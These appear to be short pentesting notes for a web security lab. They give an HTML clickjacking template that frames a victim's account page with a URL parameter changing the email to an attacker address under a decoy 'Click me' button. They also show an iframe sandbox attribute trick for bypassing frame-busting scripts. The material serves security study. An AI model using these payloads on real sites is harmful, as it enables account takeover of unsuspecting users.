Clickjacking with URL parameter:
```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```


### Bypass iframe script busting

These are things to try if there is a script in the app that is checking for iframe misconfigs like checking if the app is the top level fram.

Set a 'sandbox' attribute with te following values:
allow-forms
allow-scripts
allow-top-navigation

Ex:
```html
`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`
```


